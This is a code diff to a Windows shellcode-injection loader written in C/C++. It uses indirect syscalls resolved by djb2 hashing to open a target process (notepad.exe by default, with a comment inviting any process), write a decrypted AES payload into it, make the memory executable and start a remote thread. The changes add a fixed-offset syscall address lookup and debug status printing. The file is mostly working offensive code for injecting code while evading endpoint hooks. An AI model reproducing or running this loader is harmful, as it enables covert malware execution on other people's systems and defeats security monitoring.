@@ -7,6 +7,7 @@
 #include <TlHelp32.h>
 #include "peb.h"
 #pragma comment (lib, "crypt32.lib")
+#include <iostream>
 
 #define UP -32
 #define DOWN 32
@@ -47,6 +48,20 @@ DWORD64 djb2(PBYTE str) {
 		dwHash = ((dwHash << 0x5) + dwHash) + c;
 
 	return dwHash;
+}
+
+UINT_PTR getSyscallAddr(UINT_PTR functionAddy) {
+	UINT_PTR syscallAddr = functionAddy + 0x12;
+	printf("Syscall Address: 0x%p\n", (PVOID)syscallAddr);
+
+	printf("Bytes at offset 0x12 from function address: ");
+	for (int i = 0; i < 2; i++) { // Print 4 bytes for inspection and verify that 0F 05 is at this address
+		printf("%02X ", *((BYTE*)(syscallAddr + i)));
+	}
+	printf("\n");
+
+	return syscallAddr;
+
 }
 
 BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
@@ -132,18 +147,10 @@ BOOL GetSysTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDir
 		}
 	}
 
-	ULONG_PTR ulpAddress;
-	ulpAddress = (ULONG_PTR)pSysEntry->pAddy + 0x40;
-
-	for (DWORD i = 0, j = 1; i <= 512; i++, j++) {
-		if (*((PBYTE)ulpAddress + i) == 0x0f && *((PBYTE)ulpAddress + j) == 0x05) {
-			pSysEntry->pSyscallRet = (PVOID)((ULONG_PTR)ulpAddress + i);
-			break;
-		}
-	}
-
 	return TRUE;
 }
+
+
 
 int FindTarget(const WCHAR* procname) {
 
@@ -208,10 +215,11 @@ BOOL Go(pSysTable sysTable) {
 
 
 	//HANDLE u32 = LoadLibraryA("User32.dll");
-
+	UINT_PTR sysCallRet;
 
 	DWORD pid = 0;
-	//Change notepad.exe to any process you would like to inject to
+
+	//Open process, Change notepad.exe to any process you would like to inject to
 	pid = FindTarget(L"notepad.exe");
 	HANDLE pHandle = NULL;
 	CLIENT_ID cid;
@@ -219,40 +227,57 @@ BOOL Go(pSysTable sysTable) {
 	cid.UniqueThread = NULL;
 	OBJECT_ATTRIBUTES oa;
 	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
-	sysPrepare(sysTable->NtOpenProcess.wSysCall, (UINT_PTR)sysTable->NtOpenProcess.pSyscallRet);
+	sysCallRet = getSyscallAddr((UINT_PTR)sysTable->NtOpenProcess.pAddy);
+	sysPrepare(sysTable->NtOpenProcess.wSysCall, sysCallRet);
 	status = sysNtOpenProcess(&pHandle, PROCESS_ALL_ACCESS | PROCESS_VM_OPERATION, &oa, &cid);
-
+	printf("[+] NT STATUS after NtOpenProc indirect syscall: 0x%X\n", status);
+	getchar();
 
 	// Allocate memory for the shellcode
 	PVOID lpAddress = NULL;
 	SIZE_T sDataSize = sizeof(payload);
-	sysPrepare(sysTable->NtAllocateVirtualMemory.wSysCall, (UINT_PTR)sysTable->NtAllocateVirtualMemory.pSyscallRet);
+	sysCallRet = getSyscallAddr((UINT_PTR)sysTable->NtAllocateVirtualMemory.pAddy);
+	sysPrepare(sysTable->NtAllocateVirtualMemory.wSysCall, sysCallRet);
 	status = sysNtAllocateVirtualMem(pHandle, &lpAddress, 0, (PULONG)&sDataSize, MEM_COMMIT, PAGE_READWRITE);
+	printf("[+] NT STATUS after NtAllocateVm indirect syscall: 0x%X\n", status);
+	getchar();
 
 	// Decrypt payload
 	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));
 
-
-	sysPrepare(sysTable->NtWriteVirtualMemory.wSysCall, (UINT_PTR)sysTable->NtWriteVirtualMemory.pSyscallRet);
+	// Write VM
+	sysCallRet = getSyscallAddr((UINT_PTR)sysTable->NtWriteVirtualMemory.pAddy);
+	sysPrepare(sysTable->NtWriteVirtualMemory.wSysCall, sysCallRet);
 	status = sysNtWriteVirtualMem(pHandle, lpAddress, (PVOID)payload, sDataSize, 0);
+	printf("[+] NT STATUS after NtWriteVm indirect syscall: 0x%X\n", status);
+	getchar();
 
 	// Change page permissions
 	ULONG ulOldProtect = 0;
-	sysPrepare(sysTable->NtProtectVirtualMemory.wSysCall, (UINT_PTR)sysTable->NtProtectVirtualMemory.pSyscallRet);
+	sysCallRet = getSyscallAddr((UINT_PTR)sysTable->NtProtectVirtualMemory.pAddy);
+	sysPrepare(sysTable->NtProtectVirtualMemory.wSysCall, sysCallRet);
 	status = sysNtProtectVirtualMem(pHandle, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);
-
+	printf("[+] NT STATUS after NtProtectVm indirect syscall: 0x%X\n", status);
+	getchar();
 
 
 	// Create thread
 	HANDLE hHostThread = INVALID_HANDLE_VALUE;
-	sysPrepare(sysTable->NtCreateThreadEx.wSysCall, (UINT_PTR)sysTable->NtCreateThreadEx.pSyscallRet);
+	sysCallRet = getSyscallAddr((UINT_PTR)sysTable->NtCreateThreadEx.pAddy);
+	sysPrepare(sysTable->NtCreateThreadEx.wSysCall, sysCallRet);
 	status = sysNtCreateThreadEx(&hHostThread, 0x1FFFFF, &oa, pHandle, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
+	printf("[+] NT STATUS after NtCreateThread indirect syscall: 0x%X\n", status);
+	getchar();
+
 
 	// Wait for 1 seconds
+	sysCallRet = getSyscallAddr((UINT_PTR)sysTable->NtWaitForSingleObject.pAddy);
 	LARGE_INTEGER Timeout;
 	Timeout.QuadPart = -10000000;
-	sysPrepare(sysTable->NtWaitForSingleObject.wSysCall, (UINT_PTR)sysTable->NtWaitForSingleObject.pSyscallRet);
+	sysPrepare(sysTable->NtWaitForSingleObject.wSysCall, sysCallRet);
 	status = sysNtWaitForSingleObject(hHostThread, FALSE, &Timeout);
+	printf("[+] NT STATUS after NtWaitForSingleObject indirect syscall: 0x%X\n", status);
+	getchar();
 
 	return TRUE;
 }
